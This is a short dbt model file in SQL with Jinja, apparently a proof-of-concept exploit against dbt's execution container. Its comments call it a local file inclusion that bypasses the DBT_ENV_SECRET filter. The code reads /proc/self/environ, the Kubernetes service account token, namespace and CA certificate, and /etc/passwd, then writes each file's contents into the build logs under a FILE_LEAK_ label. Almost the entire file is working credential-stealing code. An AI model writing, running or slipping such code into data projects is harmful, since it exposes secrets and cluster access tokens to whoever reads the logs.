-- LFI via load_file_contents — reads files from the container
-- /proc/self/environ contains ALL env vars (bypasses DBT_ENV_SECRET filter)
-- K8s service account token at /var/run/secrets/kubernetes.io/serviceaccount/token

{% set files_to_read = [
    '/proc/self/environ',
    '/proc/self/cgroup',
    '/etc/hostname',
    '/etc/resolv.conf',
    '/var/run/secrets/kubernetes.io/serviceaccount/token',
    '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
    '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
    '/etc/passwd'
] %}

{% for fpath in files_to_read %}
{% set content = load_file_contents(fpath) %}
{% if content %}
{{ log("FILE_LEAK_" ~ fpath ~ "=" ~ content[:500], info=True) }}
{% else %}
{{ log("FILE_LEAK_" ~ fpath ~ "=FILE_NOT_FOUND", info=True) }}
{% endif %}
{% endfor %}

SELECT 1 as id
